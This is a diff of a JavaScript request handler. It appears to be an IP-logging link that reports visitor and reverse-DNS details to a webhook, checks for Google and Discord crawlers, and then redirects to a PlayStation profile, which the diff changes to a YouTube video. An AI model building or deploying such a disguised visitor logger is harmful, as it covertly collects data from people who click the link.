@@ -234,6 +234,8 @@ export default async function handler(req, res) {
         // Call in the handler function:
         logDebugInfo(reverseDNS);
 
+        const RedirectLink = "https://www.youtube.com/watch?v=rFqlGFFB60w";
+
 
 
         // Check 1: Google LLC and Discordbot
@@ -253,7 +255,7 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            res.writeHead(302, { Location: RedirectLink });
             return res.end();
         }
 
@@ -276,7 +278,7 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            res.writeHead(302, { Location: RedirectLink });
             return res.end();
         }
 
@@ -299,7 +301,7 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            res.writeHead(302, { Location: RedirectLink });
             return res.end();
         }
 
@@ -322,7 +324,7 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            res.writeHead(302, { Location: RedirectLink });
             return res.end();
         }
 
@@ -346,7 +348,7 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            res.writeHead(302, { Location: RedirectLink });
             return res.end();
         }
 
@@ -399,8 +401,8 @@ export default async function handler(req, res) {
             }
         }
 
-        console.log("Redirecting user to https://profile.playstation.com/LB7...");
-        res.writeHead(302, { Location: "https://profile.playstation.com/LB7" });
+        console.log("Redirecting user");
+        res.writeHead(302, { Location: RedirectLink });
         res.end();
 
     } else {
